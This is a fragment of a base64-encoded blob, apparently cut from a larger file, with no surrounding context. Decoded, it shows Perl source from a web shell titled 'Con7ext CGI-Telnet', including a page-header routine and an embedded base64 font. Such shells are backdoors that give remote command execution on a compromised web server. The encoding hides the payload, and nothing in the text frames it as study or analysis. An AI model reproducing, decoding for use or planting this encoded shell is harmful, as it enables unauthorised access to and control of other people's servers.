AkdmFsOw0KICAgICAgICB9DQogICAgfQ0KfQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+Q29uN2V4dCBDR0ktVGVsbmV0PC90aXRsZT4NCiRIdG1sTWV0YUhlYWRlcg0KPHN0eWxlPg0KQGZvbnQtZmFjZSB7DQogICAgZm9udC1mYW1pbHk6ICd1YnVudHVfbW9ub3JlZ3VsYXInOw0Kc3JjOiB1cmwoZGF0YTphcHBsaWNhdGlvbi94LWZvbnQtd29mZjtjaGFyc2V0PXV0Zi04O2Jhc2U2NCxkMDlHUmdBQkFBQUFBR1dJQUJNQUFBQUF2REFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkdSbFJOQUFBQnFBQUFBQndBQUFBY1pPK0hkRWRFUlVZQUFBSEVBQUFBS1FBQUFDd0NJd0VKUjFCUFV3QUFBZkFBQUFBeUFBQUFRRFhPVHJCSFUxVkNBQUFDSkFBQUFWa0FBQUlHbE52SnFFOVRMeklBQUFPQUFBQUFYUUFBQUdDWlZRVFpZMjFoY0FBQUErQUFBQUdPQUFBQjZnQ0xqQlpqZG5RZ0FBQUZjQUFBQUVvQUFBQktFMGtPYzJad1oyMEFBQVc4QUFBQnNRQUFBbVZUdEMrbloyRnpjQUFBQjNBQUFBQUlBQUFBQ0FBQUFCQm5iSGxtQUFBSGVBQUFWbUVBQUtXMElydDJQR2hsWVdRQUFGM2NBQUFBTUFBQUFEWUF5MkxEYUdobFlRQUFYZ3dBQUFBY0FBQUFKQXFtQlA5b2JYUjRBQUJlS0FBQUFXZ0FBQU9paG1GeENHeHZZMkVBQUYrUUFBQUJ5QUFBQWRRT1VUYVFiV0Y0Y0FBQVlWZ0FBQUFnQUFBQUlBSUdBaFZ1WVcxbEFBQmhlQUFBQVhzQUFBUE9ZbGVLclhCdmMzUUFBR0wwQUFBQjRnQUFBdFFzQnFVTWNISmxjQUFBWk5nQUFBQ25BQUFCQnFRVHZHNTNaV0ptQUFCbGdBQUFBQVlBQUFBR2RWdFNwZ0FBQUFFQUFBQUF6RDJpendBQUFBREo1YjdMQUFBQUFNN01KZGw0Mm1OZ1pHQmc0QU5pRlFZUVlHSmdCdUk2QmthR2VvWkdJS3VKNFFXUXpRS1dZUUFBTm1JRExRQUFBSGphWTJCa1lHRGdZckJoc0dOZ1RxNHN5bUVRU1M5S3pXYVF5MGtzeVdQUVlHQUJ5akw4L3c4a3NMR0FBQUIza3d2N0FBQjQybldSeDBwRFFSaUZ2K3MxTGtKd0ZRdmlJb2dsOWhoakw4UVNCR01NWEYyNUVHS01Ma3dpM0JoQmlTdDc3dzA3UG9XNHM3eUlMNkovaG92Z1FvWTVmNWx6WnM3TW9BRjJIdmxDank2WmNaeXpabXlPOW5oa0lja3doZWo5UTRhTHdsQndVSERNNkJlRTcyOXlSYWVSSXpHYi9lMlVZZXViQ0xqd0RoampncUh3aUF1L0VRNEpqaHRCNlNpK3plTHJXZVVmZmJiU3Bjcm10c2lNR2NVVmphUml1SlBwaEVuRHZEbWR4SmRLZWJ4MEtsYU9ZbXZXRGlqVWZsZHNPSEJTU2psMXFxdmh0bUtyRmYza3FUaHExVk9pYzRneVE1cEZxWFVLNU5aRjByWExUTENpZkFZWSs0ZW5TMTRzTTkveW9xdjFqT1ZwV1Z4WFVFbVYrS2ltaGxyeFZVOERqWGhva3JkcHhrZUxlR3VqblE3aGR0Rk5ENzJzc3NZNkcyeXl4VFk3N0xMSFBnY2Njc1F4SjV4eXhqa1hYSExGTlRmY2NzYzlEL0szVDN6eXJsNHp3S1I0ZU9hRkVsNTVrL00rWkhUOEFHblZTcUVBQUFCNDJtTmdabjdCT0lHQmxZR0ZkUmFyTVFNRG96eUVacjdJa01iRXdNREF4TTNLeWN6R3hNekU4b0NCNlg4QWcwSTBBeFM0T1BvNk1qZ3c4UDVtWWt2N2w4YkF3TGFFcVUrQmdXRitHQ05ROXphV0wwQWxDZ3hNQUwzNkQ3NEFBQUI0Mm1OZ1lHQm1nR0FaQmtZR0VIZ0M1REdDK1N3TUo0QzBIb01Da01VSFpQRXl5RExVTWZ4bkRHYXNZRHJHZEVlQlMwRkVRVXBCVGtGSlFVMUJYOEZLSVY1aGphS1M2cC9mVFAvL2cwMENxVmRnV01BWUJGWFBvQ0NnSUtFZ0ExVnZDVmZQQ0ZUUC9QL3IvMmYvbi93Ly9ML3d2KzgvaHIrdkg1eDRjUGpCZ1FmN0greDVzUFBCeGdjckhyUThzTGgvK05ZcjFtZFFkNUlBR05rZ1hnU3ptWUFFRTVvQ29DUUxLeHM3QnljWE53OHZINytBb0pDd2lLaVl1SVNrbExTTXJKeThncUtTc29xcW1ycUdwcGEyanE2ZXZvR2hrYkdKcVptNWhhV1Z0WTJ0bmIyRG81T3ppNnVidTRlbmw3ZVByNTkvUUdCUWNFaG9XSGhFWkZSMFRHeGNmRUppRWtON1IxZlBsSm56bHl4ZXVuelppbFZyVnE5ZHQySDl4azFidG0zZHZuUEgzajM3OWpNVXA2WmwzYXRjVkpqenREeWJvWE0yUXdrRFEwWUYySFc1dFF3cmR6ZWw1SVBZZVhYM2s1dmJaaHcrY3UzNjdUczNidTVpT0hTVTRjbkRSODlmTUZUZHVzdlEydHZTMXoxaDRxVCthZE1acHM2ZE40ZmgyUEVpb0tacUlBWUFKb2FNeEFBQUFBQUR0Z1QwQUpBQWh3Q0pBSXNBbGdESUFSSUFxQUVHQUprQW93Q29BS3dBc0FDMkFKVUFvUUNjQUs0QWRRQ3lBSGtBZkFDVEFLb0FqUUNmQUtZQWR3QnRBSEFBZndCRUJSRUFBSGphWFZHN1RsdEJFTjBORHdPQnhOZ2dPZG9VczVtUXhudWhCUW5FMVkxaVpEdUY1UWhwTjNLUmkzRUJIMENCUkEzYXJ4bWdvYVJJbXdZaEYwaDhRajRoRWpOcmlLSTBPenV6Yzg2Wk0wdktrYXAzNld2UFUrY2trTUxkQnMwMi9VNUl0Yk1BOTZUcjY0Mk10SU1IV214bTlNcDErLzRMQnB2UmxEdHFBT1U5YnlrUEdVMDdnVnEwcC83Ui9BcUcrL3dmOHpzWXREVFQ5TlE2Q2VraEJPYWJjVXVEN3huTnVzc1Arb0xWNFdJd01LU1lwdUl1UDZaUy9yYzA1MnJMc0xXUjBieURNeEg1eVRSQVUydHRCSnIrMUNIVjgzRVVTNURMcHJFMm1KaXkvaVFUd1lYSmRGVlR0Y3o0MnNGZHNyUG9ZSU1xellFSDJNTldlUXdlRGc4bUZOSzNKTW9zRFJIMllxdkVDQkdUSEFvNTVkekovcVJBK1VnU3hyeEpTanZqaHJVR3hwSFh3S0EyVDdQL1BKdE5iVzhkd3ZoWkhNRjN2eGxMT3ZqSWh0b1lFV0k3WWltQUNVUkNSbFg1aGhyUHZTd0c1Rkw3ejBDVWdPWHhqMytkQ0xUdTJFUThsN1YxRGpGV0NIcCsyOXp5eTRxN1Zybk9pMEozYjZwcXFOSXB6ZnRlenI3SEE1NGVDOE5CWThHYnovditTb0g2UEN5dU5HZ09CRU42TjNyL29yWHFpS3U4Rno2eUo5Ty9zVm9BQUFBQUFRQUIvLzhBRDNqYTdMME5mQnZsbFRjNno0eStMT3RqUnArV1pGbVdGVmxSRkhraUtZcWlPSTRkeHhqSEdOZDFYYTlyakFraDVBdlNZSXhKZzV2MTlXYlROQTNCQ1FHYXBpbE5hWmJONXViTnpzZ2lVSmZTVUxhWHNpekw5bkliZmx6ZWJyZmJiVmwzYVpkU3l2S1JpUGVjWjBiK2lPMlE3YmJ2ZSsvdjk1WmFIelBLekhuT2M1NXovdWZqT2NPd1RCUERzSnUwbjJZNFJzL1V5SVFSVitmMG10Q3ZrckpPKzk5WDV6Z1dQakl5aDRlMWVEaW4xeTI2dERwSDhIaEtDQXJob0JCc1lpc0xpOGl4d2xidHB6LzRQNXMwTHpGd1NUTDQwUnZzUHMwN1RDbmpZVnFZWEFuRHhHU3VaREpuWnBrWWtieWl4RnlVZGFXVCtEZHUxVEdHbUd3U0ppV1RLRnVGU2RsSFlyTFZKTmprRWk2YlpXUXpKOWdrUjNaWklyeDhSU3JwY2pwMG9hcHF1NUFTSEJaV0g2cmh5R0JuSnR2UmtjMTBpdWMxUnJQdUhwM1pxQm1zYjJ1cnI3K3hqZHRHZWdxbjIwWUc3MXBUTnpBNGdyUVp1QUgyUGUxT3BvU3hNeldNcEJjbFBwVW5KWXhCRTVOS2swUnlVT280MDZURThiSVJhREdiSm1VbmlUSExFaVNkZ3R2RFRVbDQ2aE14UE9ya3V5MU8wdm1vMDlMTk83V09tMjd1ZldQRGhqZjYxSGU0SjVOaEdPNEY0SWVQQ1pDYm1ad1grSkZ6dWp5cFZDcW5CNWJrREtVbStKeG5pRmR2am8yelFybC9rVHNsTTlySmNZZTd6TGZJbmN4ck5mUVV4MWNFOEpSV016bXVLekdhNFJTUktrWEplMUgyQU1VZVhuWUJ4VTdUSkZ6ZUdCdHZjTnBMWXBJbE9XNXd1b0RKZXZpSlhwUU5jRnB2d05ONkJrNXJrcEtUbDB2aDM1bGdwRUVTazFaNEo5Yjg2enUxakRObW5GanozanRIOElQazVjZFpyOTRPTk5CWEhiN0NEY2RMUEFiNDRPTEhqYTVTK09Ea3g4MU9FL3lBcDY4Q2ZYWGdLLzdHVFg4RC82cU0vaXU0cHE5NG5mTGlkZno0bS9HSzRpOERlSnhyNEZrT0I4d0x5SkZ5ZjBXZzVvci9TUTFlbUNKN09tVVB3VitLbzMvT0VQMEwyZkV2QTZjeWo5YTkvbDdEVitwL1ZuZThidStqOVQrbW4rSHZpWi9XLzVTMEh5RE4rMGxIUWNLLy9ZV0pBNFVjYWNjL09BNXlUWmlkSDJXNW85cURUSm81emtncFVWcVdralhjWkM2bFFXYW1rc0RNU2xGMmFXRWlramxYSlI1MHVVdEE0bGVJa3YyaUhPSW5wUkF2SjRIRHJxU2NnTWtvUzBvSlhpNEIxc2RCOERQd0hyS0R0Sk9zbEJSa3F5V2JsUksybktaeWNSWStsUWhTTkN2RmJYSzVINWVGSmdVL1pMSlNwVEJPN1A3NEluZFdjdG1rY2xnbjlhU0NwSkpyMlBUeUdqWlN3NldYcjhpQXRGWVF0NzZHaEtwMFRrY0Y2NjdnVUh5ZG9YUU4yUm5QZkhtd2RkT3Fza1RYOWxXWkhWM3BFMGVQZFI2SWhtSjdOKzBjQ2pYMlpKcjNicXo5K3VQSFJyKysvUUdmNkk3VmhsSXRtWmpEa1d6WjFMcjNsT3VWbHpRVndoZ2Y2bXlQWmVOaGg2KzJjN0JqOTJuSG03L1FKSUJsakpZSmYvUno3bld0QlhTQkZlUS93cVNZTTB6T2hDc2dEQy81bUlaWnBJbFJ6UUFLQnc1NDZJRjhJaERtelBDbWZMT1gwRzkyK28xSXkzR041bmtidzhPaTVhblE1M1hLTngwdmw4TzN4Y3EzeGJ4Y0E5K3E2RGM1RFF4MjhZSXRWMklGMVpLVmF4YkRaM000a0VXR0psRGxsRmZCWVEvTWdheGpzc0JMKzB5ZFExS0VjN2hTeVJYcDVkWEFTRExqWEdiRzhmQ3VyVnQzM2J0dDZ5NExaemg4NmIxZ1NoUVRDVkZNa1QzM3dFRTRPYlFIditKaDdvY252dkdORXlkT25icjBvdWFkRDAzY0QvdDI3ZXFEdjB2dm52akdZMTg5OGRoako5UURvS0hyUDNxTGUwSExNekZtQmRQSWJHVnlWY0ErS1pMS2xRTFg1QWJOSkpIV1VkVzExQWk2WVNrcTFZeDVVbHJLeTNVd2JCNldkaE84WjVhQzJIQlpxVTdJbDBaU3krMG9ON3h0M09WZWxJQ1BqTnhRSmRqT016cCtrYmg4RlJ5Z0hNalVrUFR5Tld3cVdjR2kxTGhCbE5hUWpOdEM5UEFwVkIyeGdGalZzQmxIQmNHZndsZTd3d1cvVUxoUmYvdWQ2YldwN3J0V3B6ZTNpL2Q5b1RuVUZ1RTl1a01tTVNSMmgzS2hXT05qUGUzM2RTODcwN25yNEtxbUk0MjFxenZDcXpkMmRxVFNONVAwaHU5M3RSeHQ3OWgxUTZTeWFXTkQvL05kTjBhN3hPeitUdHV1YjkvUWVMQzlaVzNuOWFuZVhaMGQyN3kxblgyUHRxZnZaL3RxTjdmWDNWL2J1cjRMMXl0NW5HdGplMERYbTVrZ0k1V0lxcG9ua2tYUjhmd2svYk5PSzNmVnBEeWUweG5OaHEwR3MxR0grangrejU3ZG9yaDd6NzJvQTk0b25PSGMyaE1NRC9hRFNBSzlrc0U4S2R2b1ZlekxiUmwzU01mU1ZhYXZadC80NVdRdis4d0w0cTBQYjduNXpUZlljSUc4ZkdiNGFPRlBmemI0MHROU3ovQTU4dExNYTlyb05lMmlaTGtvYStDYUR1V2FHWmVOV3J0SWFvVU5WL1ViY0tuVlErZnV1WWw3NWtYeHRvZTF3ZUZ6aGRSSHpNaTdQM3V4YS9nb0dmMlh3Yi83am9UWEhXSVo3aURZbmFWTU5WaGhhbnpqb21TNEtKZkNzR0ZoeUtVR3daYlhXdHlWVVp4OXZCWE9iZzJwSTlTK3JTSDFvRGJvUkFlSVBrSW4xMG9pR1poKytEeVVzYlFjYWVSOWtvOXZIR3V4cEUydFgydkw3SW9heGtwajF3V0MxNG1saDR6eHdVemIxMXU0bzZkMS91dkNyU2R2dEZyYnY5NGFhZkxxVG12Y1pZYlVRSDNwVmxQZGcwMU5SOVlZTjV2cmQ2YU03aktrdTUvcDRVNXhyNFBPNkdRa1JwVDBLWmx3azVJMm1XTUlhbFhHV0JMTEVRWS9FZzRWckVtVWpCY2xOaW1YMkNiQm9PVktqSGl1UkE4L001YmdSeU5ZT3Rtc3NETWRCUFFRZEFhRmtOQlBlaDRpdllYSEh5S3ZqSkhkaGYxamhYMWttS0d5a3lpOHhyNU0vREFqaXhtWWtueXBLanNPWkdEZVVzcFlRS01BTHBBdHdFTkppOXpUcnVIb1dsSDBBa3dZU1lSYjZoTFd4dHErMnJaMjhkYXhqWThaaElBWTFmWEVPcnQydE5lT0RuU1k2TDBDNUNuMnAyd1ByUElxSEs5TTlKUDRSeVNOS0RPZ3Y3aFN4Z2gzMDZxQ0duVEN2L2dlZWVya1NmaTMyd0ZySFNOQjRGVmFRVnA1cm9ReGcwcWQ4Wmt5Q0RTbWpsS3R2cW5zbUFtcnlQYk81cWJPenFibXpyMzF0OXhTWDNmTExaUVh6S0hDT1c1UWV3em91NTdPQjVkQzB1Z2FzbEtjUklBUHJIRVNLVVQwc1BxdE4rOUcwS0NSR0Y0aUYrQVhFbnVCbFFsTHpUVEJTUUJsZW9oZGZlYnlEd3JuZEw5ODM0WDM0Wmgrc0JXUGdZNHJaUUtnNTI1VGthT2duNlNtUWZicEovT2hhQWxZQWpsVUF0eFpTa2t3QVFrbVhxNEVQbFdYTW5XZzlhc1ZHS1N6VHNweGVLK3VGR3pqSllLUG94b3VGSVZ2T3BPTFVkUWJiMHNsYlFMUGhxcFlPNnpab3VFTVZWbFk5d3pPOUwvKy9BdXZ2ZmJDODYrZjlXVDdtNXY3czU3aSs5N0dkS3FoSVpWdVpJZGh0WFFYemhTZWhmLytpdndKcWQvNjdZT2RuUWUvdlZWOTcweC82bFBwZEh1N3d0UGpNT0JSV0pzOGFQT2NBY2Rab29nNFI5ZXBnQkl0YTQyVE9TMlZaUzJWWlMyVlpRUElNcWdiT0V1Vk9iSVRWbVJLU0RtRElOc1dUbjk4Ni9lNzduM3JjamV4dWV0djZJeHd2NDUrL3RZUHZ6bzJ4dTEyeEtKaEtuUE1FTngvREhpOUZQbnN4UHZiQU1wb2tjOFJGRDFRRkdVWFpSdmdjaHN2VjhIZEROYkpuS0VLQ1RBNGdBQlVIN1l5c0pUT3BZQk9xb1J4czlZZm9SeTJPWUdzc3F3VUVjWVpnMytwd3VjMVhIRlJXRGduTEw3cTVXaFRNbXU0SXJmMVEzeGozK0RhNTU5SmRkMlJDWHl5TmNGZWY1bGhWL1hldFRMZVZSOEoxYmJIMHoxTkNaTm10MjJGV0huK1RPTjl1d1l6Z2U3ZTdzQ1kwVzNzUHZybjk2eU1kM2YzSlRMdEtZOC9HbEhHdUJ2azZRQ01NY2tBNnE3Qk1XcEFsaXB3akc2UUpZdTVwZ0preWFLRjRRS2EwMStVb3lCTGpzcUxnaHdDMlZrTzYwUFcxQ2c0eXl6SUpBb0R0ZGlrNnF6a0ZtUnZDTDVWMkNUZkZPUmFnVU9KZ1IyaE1vVEdUeDlaUTRwbXM0TGc2TkZTN2c0R3g3WStkaURiUDl3VVd4M2YwSkVZN2U0WmpqYkd6dDJ4NlhCZmZOc25ONDVsQm5MRDRxYnVwc2dSUGo1NlozUC9xcklEZHJHemZ1dG5VcjdSd0xwRTcrN3JOOTBmOXYvRmx6b1BiVjVsZGJuUjUySmFZVDRuUUo0c2pKUFp3T1RNaUxCMENLZ1lxMWxuamtrR2NDaDBrNUlSSEFhWEtKa3ZTbnhTTmdGQTBDZHpKalBPcWdtVnF0bUVIODJvTGQzb0VaaGg5RHFZVXl1ajRGS2RJQWs0bldsUWRTaHdJVkNpWVpTNTF0RG5qcDN0T2ZYd3c2Y0tPOGpSek1EMm0wblQzWjAvK3BmWGV5NjlmckR3TkdrNkNNYjU4TmRPMFhuWmovTUN0RWFZWHpPNVVIRmU3RGd2TG00eTc3T0U3REF2UHB5WHhhSlVjbEd1Z09tSUtycWwvdUtIVkxkSXZocUxKUEJnZkdTci9uMHRmSlJkK3ZjbjZ2LzJnNytIMDZXU2xSL25yUUw0RUQ1d08zd3VjQ25LNkt1SHZucnhOUWMvcVB4UzVaZENPb3RneStiZ0RMeEozaXdLTHdqeWVTc3Z1TXM4WHRYQklBMGxMdC9zUTRvNmt5dEtZQms0bkJTV2h4UnhzWUM0VklDQStCQ1R5M2E0c0dTN0FwdUhnSVd3RUdDNWFseEYwZGdmREI3WTJybHpYVUFjK3R2akpxdFJwMkUzRnBLczNtQmdpZTJEOU1DNVhZa04zV3RSTE1MMW5mSG1PMXNqdlk4Ky9GRG5ZZjlOVy9yOXhoOS91MnNNQk1MaFJubllDVHcrcHZtQThUSng1aFltVjRaY3JpeXVjQjF3MmJLNFRJdlNyd011MTFCTjZnUHBCM2FHWWVMdHdIQVIzc00rZ01pV3NsTDBRT3lDck5YaElCZURRcFVaTzY0R1FTcWxJTkcyWWhFZ1FrNWZsSGNjRGtKQ2RzWmkwRGwyYnBvZ3BYOXAzWkU3Mk85SkRLM2Qvc2hOMFpyK28xdGUrWWV6cnN3dDYrcytsWFlQN0c2OE04T1NTMDhSLzRVdDdHRTJ0dUhMTzkzbGEzZU10VFVmMmQxR2ZKYzZEdTJvVDdWdmlPM1o2eWx6TEFaWkdnVzVQMFhsZnJWaUwzSUVSOGlnRHJOUzRUSHdvTGdvQ2pBQVdKQjUxR1V3WTVJUmhrSVlxa0lwS25CYWlKSG9ReXU4YkdhVUM5VWRIdTAzL2JYeDAvY2V2azZ6NGFFSFduNVRlS1Z3NXN3UjBrd1NSTk9sMkt1dHlHUFFMejZ3VnJXNDZ0ekk1YUJ1TW1kRUdqTEkydFdVdGVXdzByU29XQUNkUytYVUNaU3RjS3dhanprQTZpRklUd0k0ZjhMSXVZTlJHMVdrbVNCOFo3UldSMVNjd3VMVk02RzRZcHhxWmpKNkJ2eFc5T3JXWFozbjByY2Q2dG44WUc5MDUvV3Z2UGp5cnEvZUhEa0YxcXVwL3VaYS8rbUhPbnY5dXcrMjkzbFNuZG5hamhVdVVyL2pkR3JqaTgwai9kbTZEVU9aSFkrS20zNXk4dnNObTRhendldnJJbFdyV3hjTjdRbkd2OGd1N25vd0dQLzhSdCs2VENTY2FRSjUyL3JSSmZDTmVjYkZSRkhlU3BFVHBxSzhoVUhlYk41U2xEY2JNbVVKWllvYjVNMU5MVGNhRnprRzcyNllEN25VbEVYSE5xZTFXYWxyNXJYQkpGbXpVbGlRRGFwYmhqeXdPWGxHRzBrdXloUWRFUFRCTWl1V1Q0MGNaZXVILzAvaGNPR1E3dWZFRTAvc1dydmo2RTNSc3lCamQ2VlpWK1pXS25IY1VQT1JYVGNXL3ZtRHdyN0NLRHYyNUUvYzN2b2RCenYzakphNUhXRm54OWdkOWFtMmZvWlZjQmIzSkdBVE44ejFMS1JsSmZEWnFTS3RNaHlhWkVxcUtFdXlGVC9KbmpsNFM1Z1hlMTJKd2RoWHBzRVlTeGpBcFk4Q0hYYkFTTXRCNHZEZWZ2WGVsWWhOSlVkU2hhZVNONG54SElwUWMxcTNINWs1RDBxZDZlUVM1Z3JFZW1PUm1yblFWZE13VFJkaE5qRUQzQm51TVViSE1QWTBjWmNRL1NiT0xWN2V4UjRReWJOSFNNY0RoWGNMN3h4aXFLM3FKeGJBOTJFYWQvUXFpQmV3RDRCZExRZkNZUkF4SktJZ2RTZWkzWDZ1K2RJRTEwd3NEejVJOWozNElIUGwvVElsSkVPY1pCUDdwY3YzaXB6NzBtU0JtSWp4Z1lKMHBDRFIrejM5MFJ0Y0M4aG1PV0Q1MjVsY05kV0ZKU3FxOU9BOW82TGt2eWlIU2lmSCtaQWZYR2VyamNacVhLcG9Mc0hseWdOdzVEeVYxZWd6aHdUSlFTTXVKcEJQRCtqRG5NRmFqa3FTRTBEOVUwQ21La0tOTXhSWlBxVURaL0w2NmJxdjlXemQxeDRRbXp1YnhTTnM3NTAzM2JhaGRxaTJIMk9aR05QVVBCK3F6dmJja2FqYjBOM2V0WEYxcEdkMDUyZGIydnY5bFpkRU5ieUpZK3Nzdk1rOUEyT0xnLzc3SEtNc055OFkrcWdvTDlMUm9HcEtNeW10RW1VSG10TTZ1dkFDb0lRQ3ZDekFxR3BBQ2RYdzhnb3dybTV3bjBBVHJZR2pLMnJRTDNTWXZJdHdzQ1dDWEIzQmhXaGFKRkQ0a3hLa2txeTB5cFpqQWtKV1daQTJITERMS1NoclVaRXVONDdaUW4zaFZETGoxa1dxYWdnYnB0OVdaQVFhamVwczJ5ZHR6dit3YmlUZE10eVgrcHRIK1lCd3gxREx2ZDJKeE5iSEJqcDcrQjAzUGZMNm9XYnlrakc4YmpVZmRkc1c4VDBieU51dkVQRkMzMjlmdTF6bnNZa2JqOS94elBNc08vcmw1cSs4ZlhiMDM1KzQwM3ZBVC9hOVJsejNSMi9weUdoMDVGMmQ1b3ZBSnhzbzdGK0RuYkF5TG5EeGNneGFpbEtURldPd3lMTzhCWlFKd0NRaGhSWlJNZ05NY2xOZVdVRkpXWG5aaE40eWVNMWxhbnowYzI4N0VJVlkwTU5oTDJqaEo1TGx3a1RkMFYvZlQ4RUpEK0RFZVVGbVdJUE0ydDYzU0pvTEU5OWI5dS9iOEJ4QUZUaHB2eUNYT042WDlCY21uajM2bTE4b3gwMjhaTDRnNjBzTVVpa3ZsY0RWL3VIZnQxTXN3L0RqaEdFQnk3RDhPTWRxN0xHSjc3MzZxekE5cGVmSERmb1NPRlhDanh0TE1HWnE1OGR0ZGdBK0UzV3hYOVhRMy9EOHVJdDMydEZsWm1mZ0hiZ1N2c0VwZklPcnpEZ0hWOEEzdUNLOE1RMG13bklhUFJoUm05M3BtaGwxSlEyODJjSUxDNTB1UWlSRzF2SnFHRCtGOWpYbDhyTHVFQmZrN01GcU5xSmpiYUh1MnorNzVvZTFkOTdhSFJxL29WRFdPa0NPaXp0RWNlZCtzcHJjUU5xUEhTdmtDazhVL21ZL2FTdmt5YXRQa2U3aDBjSlphb04zZnZRdWQwTExnQjZKTWl1WmU1aWNDMWQzQmRoZ1JMOXlHaXpQa3FnTEVMQzhCQzFQVmtFNnNBQ1dKQkhzaEJEc3dMZGxhSWhMd1lWZEJRZVcrZEJIZFBFVjFBeFh1QlJNRnhVa2UxWmFZcFA0ckpSRzRDUHBFQk12UzJRRTlHNFUyRU54dmk2STltZ2E2azA1QldpWWRQcWRnVTkwZFFUN1QrMWVWNzU4WFdUckEyOFgzZ3QwZG5aK1NkTlZYei9VdXpMVnRiUDI3TDdVNXM1RWZQMnQ2WFFINzlDOFpERHJOTUgya2Y1NFYydkc0di9LOE5QUGFuU21FVmJuelBTMjFIZW4zQWVkOFJ0WFo5b1RUbGFMOFJQQUplZEFKMVF5MXpHNWN1U0hVNjlhNGxMOTVIaFp1ZFlBMWlKSVdjR0RlcXRDVDhkWkRzUDBaT1ZTY09weVRBbVAya3dyU0lZcGUrdHk2MmVzNXhVWUFjUzEzdDkxK01LT3RxKzFKZmJ2NnRwM1Mycmx4Z01kdFh1YjR5M2Z1SG5nbVlNZDdQQmp2enZkSFJVUHRyZnNmM3BvNzdNamRZSHFnOUZJeDJNZlVJejZMdERKQUhZclo5b1ZuMFVXdUpsNjJhK3NRU05kZzBWdFhJRnhYQ3NBQlRQTkVBbG1aWDQ4U0t6RUZlZGt4VFFTemJnbyszbXFnbmVPamd6LzM4ZDdlbzYvY3Q5SUpKWHVHN3N0L2Z6M2ZDa0hjRG5RL05WM3owbnZIci91eTdyTTd1L3VJK3pid0U3ZzV3UUkyam1hejJwVk5BZjY2Z3JPMUlCOGFRME1BZm1peG9zR1d1UVNveEtHb2lHcWt0SVNmT1ZLMUpDVUduaFJZbERLM3dUNy9PV2ZrdGNMWWJaTjg4N2h3dkJZb1g1TXZTLzZTU1ZNZzZxeDV0d1RaZG80enoybjcxWjZ4ZDBtMkpjdnYwWitVZkRpbllZT1hjNHI5aFJsNWhUSVRKalp6T1NDT01ZeWtKbXlJRjZ0ckJ4Y1F5bytGaHhqTmIwZnVBaWdhMmk2cnNLSWpxVWNnWTgrT3pvTTJpQktUd1V1RWtZdUF4Z3JWVkNmaUNsRm9VTG9YUlFxREpPaUpaZ1dLeUdsR3BIK3prUGZ1YlA1amhzUzVwWGk2UFh0KzI1Smk3MWY2SzV0NUU5SHpnNE5QcjJ2bFIwKytidlRQUTUvUmNtaHNOaTYveGs0dUwrTk41Qi91bnpPc3JUbjlIdDBYSDJxZjFESzFDczhsUFFweWtaSm04cHpSc3BGYm5ybVFBVkliQklVc0d3Z21CdVQ5YUFUaWhPR1NjOFVlTHhCb2U4MGVlLzA2WUpCODg3bFNkYjlvWWx0djV4VCtIZ2U3dGRLNzNlOUtpdUliVXFTQ3Y5ZzZzRGpwamRqNlpUbFN0aGlxQkpZbUdPcG44SnE0QnVUTE40M0RmY0VHQlFDZi92OHUrK3lENzM3N2hqM284T0hMOFhHYUU3cTUxd2YzTS9PckdGeUFxUGNRL0UvU25CWURocllNTUdkOU5TMzE1ZVUwTGdsK0txQ3NtNUtCTHBpaWtFTUFZTklkTmxVNzF3WEdlM2VPMXJvWUhzaUd4NGJIdjdMdGdQK3RRY2ZaNTgrZk9sVTc4bWhwbWE0LzE3VnJycVlaU3AvclNwL2RhbWlEWFZScHFMdFZEd3VtWE1pYWtDR3JyQmxVanJRbXB3N1ZNTkZoTDJuOTczVDk5eW10KzV2UFByQW50aDNVN3YySFdvQkh2L3RBYkowOUpIQ2EwY3pENTM3L3ViKy9JbFI4ZkpqQ3IrTGExUExMRlg1emFscmswZzZKVVlKWStmb3F1QzBNSGI5OUdRNkowN2pndnZ3cTJQS3RScmhXcy9BdGJ6TUkrcFlUQ25WWVRha1lEUStlajB2UUNZdmoya0RaQ3VtbXhBUmZPOC8zcnhBVGI4T3JMditndXgwdlM4NXdJYVh2ZmtyeGJvYmFtU2QzZ0NuTExJTnp0a3ZNSG05emU1d0tuYjBQSnliK3FiR0Zid01qU3pMSnRCMUFMaVlvdkgwa1pTWDJFUFZSamJDaFRpZGtkVTM2bmgzaGYycnozLy9hOUdRNVp1c1ZxZlRQUFhRMDZ4T3AyZFBrT3RKRTZsOThQSUJkbGZoUjVjUEZjN3NKQ3l4RWQrK3k4K3dqZnNLYnhUZUxCUjJLdU1md0pnZ2pGL0FtQ1FkdjFHZFN3T00za1pITDVnbU1kWUNYSlNOcGtuWkR1OTZFQ1NaTGMycS9yU3M1OVhaaFZuRjlWTE4xcENJTUhDMmE4L1dqV3UrY3JiNXZvSFBydEs4Yy96bnIvN0x3OXpMSDVyT0VNZmJyKzY0WkZKOGcxcVE1K2UxUFBWdm1waWNGV2ZVWGZRai9TalJsWlFPQjRicWVObUxkRmhwM2xyMk91RG1WaTNTNFhmRFIrTU1aN0ZvQ3RCUHhKQnZlamxHS0dvYmR6MitlZFBwWFUxTnUwNXYydno0cnNhelh6dzBkdmp3MktFdnNzTm5QbmpzRTU5NDdJTXpaejQ0MWQ1KzZvTXpIeFRlSmNZUFBpREd3cnRJNXlPb1Y4QTY4Q0F0SGFwMnBvZ0RpTTFiQlFZUmh4WEpWWVNHaHlVZ0pERlppVG1EVWl1Vkc5bkpxL0UxTjY3RlVocGZJNVIzUlVTaGl4R1BFbHNNZ3UxNkpQd25QVjJoZ1RNRG1WOU9QblQvOFljTDc2WnY4MmgrYWpBYjJPeTJzWjduWHkxRTJLM0REeFRRYkNFdkMrZUFseGJxOTN4QzlRMnFRUU01d1J2UUtGNFBrT1lIVHZvVkpHUlVmWjJRSHoxR0w3cmZrbEZRWTF2VndONXhJK090VklNUjAyekY1YXVINVZ2TjJ1ZGo3b3FOQjd0MDJaNkJOWkd1NDhQZGxzZWZuZWJ5N2pNZmZLT2o0eHNmbkRuMnhxbCthN1EyNWpmc3Q4UmI3MmdQa1RvU244VnlHQS9LWjE3RmVyZXBFaXFrRkxiRHVQSWVIMlc3WnpyRTRBVzIrNUs0WEZGQVN0UW9ROUFMdzlNNVRXcGVIUkN1N1BNSTZNeEoxZFMxVVlHZE1n